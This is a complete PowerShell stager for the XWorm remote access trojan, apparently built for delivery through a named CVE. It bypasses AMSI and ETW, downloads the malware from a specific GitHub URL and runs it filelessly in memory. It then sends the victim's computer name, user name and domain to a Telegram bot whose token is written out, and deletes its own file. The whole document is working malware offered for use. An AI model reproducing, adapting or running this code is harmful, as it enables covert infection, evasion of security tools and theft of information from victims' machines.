<#
.SYNOPSIS
XWorm PowerShell Stager - Loads XWorm directly into memory
.DESCRIPTION
This stager downloads XWorm from GitHub, bypasses AMSI/ETW,
and executes it filelessly in memory.
.NOTES
Author: Generated for CVE-2026-21509 delivery
#>

# ============================================================================
# AMSI BYPASS - XWorm V6.0+ technique
# ============================================================================
function Bypass-AMSI {
    try {
        # Method 1: Reflection (works on most systems)
        $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
        if ($amsi) {
            $amsi.GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
            Write-Verbose "AMSI bypassed via reflection"
        }
    } catch {
        try {
            # Method 2: Memory patching (fallback)
            $Win32 = Add-Type -memberDefinition @"
[DllImport("kernel32")]
public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
[DllImport("kernel32")]
public static extern IntPtr LoadLibrary(string name);
[DllImport("kernel32")]
public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
"@ -name "Win32" -namespace Win32Functions -passthru
            
            $ptr = $Win32::GetProcAddress($Win32::LoadLibrary("amsi.dll"), "AmsiScanBuffer")
            $b = [byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
            [System.Runtime.InteropServices.Marshal]::Copy($b, 0, $ptr, 6)
            Write-Verbose "AMSI bypassed via memory patch"
        } catch {}
    }
}

# ============================================================================
# ETW BYPASS - Disable Event Tracing for Windows
# ============================================================================
function Bypass-ETW {
    try {
        $etw = [Ref].Assembly.GetType('System.Management.Automation.Tracing.PSEtwLogProvider')
        if ($etw) {
            $etw.GetField('etwProvider','NonPublic,Static').SetValue($null,$null)
            Write-Verbose "ETW bypassed"
        }
    } catch {}
}

# ============================================================================
# DOWNLOAD AND EXECUTE XWORM (FILELESS)
# ============================================================================
function Get-XWorm {
    param([string]$Url)
    
    try {
        # Download XWorm executable
        Write-Verbose "Downloading XWorm from $Url"
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('User-Agent','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        [byte[]]$payload = $wc.DownloadData($Url)
        
        Write-Verbose "Downloaded $($payload.Length) bytes"
        
        # Load XWorm directly into memory (fileless execution)
        # This works because XWorm is a .NET assembly
        try {
            $assembly = [System.Reflection.Assembly]::Load($payload)
            
            # Find and invoke entry point
            if ($assembly.EntryPoint) {
                $assembly.EntryPoint.Invoke($null, @(,[string[]]@()))
            } else {
                # Fallback: look for Program.Main
                $type = $assembly.GetTypes() | Where-Object { $_.Name -eq 'Program' }
                if ($type) {
                    $method = $type.GetMethod('Main')
                    if ($method) {
                        $method.Invoke($null, @(,[string[]]@()))
                    }
                }
            }
            Write-Verbose "XWorm executed in memory"
        } catch {
            Write-Error "Failed to load XWorm: $_"
        }
        
    } catch {
        Write-Error "Download failed: $_"
    }
}

# ============================================================================
# MAIN EXECUTION
# ============================================================================

# Hide errors
$ErrorActionPreference = 'SilentlyContinue'
$VerbosePreference = 'SilentlyContinue'

# Bypass security mechanisms
Bypass-AMSI
Bypass-ETW

# Download and execute XWorm
Get-XWorm -Url "https://raw.githubusercontent.com/blockedboy04-png/ra/main/xworm.exe"


# Send Telegram notification
$info = @{
    chat_id = "6727246693"
    text = "☠ XWorm Victim: $env:computername - $env:username - $env:USERDNSDOMAIN"
}
try {
    Invoke-RestMethod -Uri "https://api.telegram.org/bot8740776369:AAFl8tpI9ILnda-rsB5s6W7V_bnvaPUkOxA/sendMessage" -Body $info -ErrorAction SilentlyContinue
} catch {}


# Clean up stager file (self-delete)
$scriptPath = $MyInvocation.MyCommand.Path
if (Test-Path $scriptPath) {
    Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue
}
